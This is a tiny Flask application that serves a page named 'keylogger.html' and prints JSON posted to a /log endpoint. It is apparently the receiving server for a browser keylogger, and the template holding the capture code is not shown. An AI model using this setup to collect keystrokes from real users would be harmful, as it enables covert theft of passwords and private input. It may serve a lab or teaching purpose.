from flask import Flask, render_template
from flask import request

app = Flask(__name__)
@app.route('/')
def html():
    return render_template('keylogger.html')

@app.route('/log',methods=['POST'])
def post():
    param = request.get_json()
    print(param)
    return "ok"




